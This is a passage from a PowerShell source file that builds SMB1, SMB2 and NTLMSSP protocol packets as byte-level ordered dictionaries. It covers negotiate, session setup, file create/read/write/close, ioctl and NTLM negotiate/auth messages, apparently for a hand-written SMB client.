    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequest
{
    param([Byte[]]$FileName,[Int]$ExtraInfo,[Int64]$AllocationSize)

    if($FileName)
    {
        $file_name_length = [System.BitConverter]::GetBytes($FileName.Length)[0,1]
    }
    else
    {
        $FileName = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        $file_name_length = 0x00,0x00
    }

    if($ExtraInfo)
    {
        [Byte[]]$desired_access = 0x80,0x00,0x10,0x00
        [Byte[]]$file_attributes = 0x00,0x00,0x00,0x00
        [Byte[]]$share_access = 0x00,0x00,0x00,0x00
        [Byte[]]$create_options = 0x21,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length)

        if($ExtraInfo -eq 1)
        {
            [Byte[]]$create_contexts_length = 0x58,0x00,0x00,0x00
        }
        elseif($ExtraInfo -eq 2)
        {
            [Byte[]]$create_contexts_length = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]$create_contexts_length = 0xb0,0x00,0x00,0x00
            [Byte[]]$allocation_size_bytes = [System.BitConverter]::GetBytes($AllocationSize)
        }

        if($FileName)
        {

            [String]$file_name_padding_check = $FileName.Length / 8

            if($file_name_padding_check -like "*.75")
            {
                $FileName += 0x04,0x00
            }
            elseif($file_name_padding_check -like "*.5")
            {
                $FileName += 0x00,0x00,0x00,0x00
            }
            elseif($file_name_padding_check -like "*.25")
            {
               $FileName += 0x00,0x00,0x00,0x00,0x00,0x00
            }

        }

        [Byte[]]$create_contexts_offset = [System.BitConverter]::GetBytes($FileName.Length + 120)

    }
    else
    {
        [Byte[]]$desired_access = 0x03,0x00,0x00,0x00
        [Byte[]]$file_attributes = 0x80,0x00,0x00,0x00
        [Byte[]]$share_access = 0x01,0x00,0x00,0x00
        [Byte[]]$create_options = 0x40,0x00,0x00,0x00
        [Byte[]]$create_contexts_offset = 0x00,0x00,0x00,0x00
        [Byte[]]$create_contexts_length = 0x00,0x00,0x00,0x00
    }

    [String]$lease_key = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
    [Byte[]]$lease_key = $lease_key.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequest.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequest.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("DesiredAccess",$desired_access)
    $SMB2CreateRequest.Add("FileAttributes",$file_attributes)
    $SMB2CreateRequest.Add("ShareAccess",$share_access)
    $SMB2CreateRequest.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequest.Add("CreateOptions",$create_options)
    $SMB2CreateRequest.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequest.Add("NameLength",$file_name_length)
    $SMB2CreateRequest.Add("CreateContextsOffset",$create_contexts_offset)
    $SMB2CreateRequest.Add("CreateContextsLength",$create_contexts_length)
    $SMB2CreateRequest.Add("Buffer",$FileName)

    if($ExtraInfo)
    {
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($ExtraInfo -eq 3)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementAlSi_AllocationSize",$allocation_size_bytes)
        }

        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
        }
        
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))
        $SMB2CreateRequest.Add("ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($ExtraInfo -gt 1)
        {
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Key",$lease_key)
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
            $SMB2CreateRequest.Add("ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }

    }

    return $SMB2CreateRequest
}

function New-PacketSMB2FindRequestFile
{
    param ([Byte[]]$FileID,[Byte[]]$Padding)

    $SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_StructureSize",[Byte[]](0x21,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_InfoLevel",[Byte[]](0x25))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_Flags",[Byte[]](0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileIndex",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_FileID",$FileID)
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Offset",[Byte[]](0x60,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Length",[Byte[]](0x02,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))
    $SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern",[Byte[]](0x2a,0x00))

    if($padding)
    {
        $SMB2FindRequestFile.Add("SMB2FindRequestFile_Padding",$Padding)
    }

    return $SMB2FindRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

    [Byte[]]$buffer_bytes = ,0x00 * $Buffer

    $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
    $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
    $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
    $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2QueryInfoRequest.Add("FileID",$FileID)

    if($Buffer -gt 0)
    {
        $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
    }

    return $SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Int]$Length,[Int64]$Offset,[Byte[]]$FileID)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)
    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $SMB2ReadRequest.Add("Length",$length_bytes)
    $SMB2ReadRequest.Add("Offset",$offset_bytes)
    $SMB2ReadRequest.Add("FileID",$FileID)
    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Int]$Length,[Int64]$Offset,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$length_bytes = [System.BitConverter]::GetBytes($Length)
    [Byte[]]$offset_bytes = [System.BitConverter]::GetBytes($Offset)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $SMB2WriteRequest.Add("Length",$length_bytes)
    $SMB2WriteRequest.Add("Offset",$offset_bytes)
    $SMB2WriteRequest.Add("FileID",$FileID)
    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2WriteRequest.Add("SMB2WriteRequest_Buffer",$Buffer)

    return $SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest()
{
    param([Byte[]]$FileName)

    $file_name_length = [System.BitConverter]::GetBytes($FileName.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Function",[Byte[]](0x94,0x01,0x06,0x00))
    $packet_SMB2IoctlRequest.Add("GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_Length",$file_name_length)
    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_MaxReferralLevel",[Byte[]](0x04,0x00))
    $packet_SMB2IoctlRequest.Add("InData_FileName",$FileName)

    return $packet_SMB2IoctlRequest
}

function New-PacketSMB2SetInfoRequest
{
    param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$FileID,[Byte[]]$Buffer)

    [Byte[]]$buffer_length = [System.BitConverter]::GetBytes($Buffer.Count)

    $SMB2SetInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SetInfoRequest.Add("StructureSize",[Byte[]](0x21,0x00))
    $SMB2SetInfoRequest.Add("InfoType",$InfoType)
    $SMB2SetInfoRequest.Add("FileInfoClass",$FileInfoClass)
    $SMB2SetInfoRequest.Add("BufferLength",$buffer_length)
    $SMB2SetInfoRequest.Add("BufferOffset",[Byte[]](0x60,0x00))
    $SMB2SetInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2SetInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SetInfoRequest.Add("FileID",$FileID)
    $SMB2SetInfoRequest.Add("Buffer",$Buffer)

    return $SMB2SetInfoRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)
    {
        $NTLMSSPNegotiate.Add("Version",$Version)
    }

    return $NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

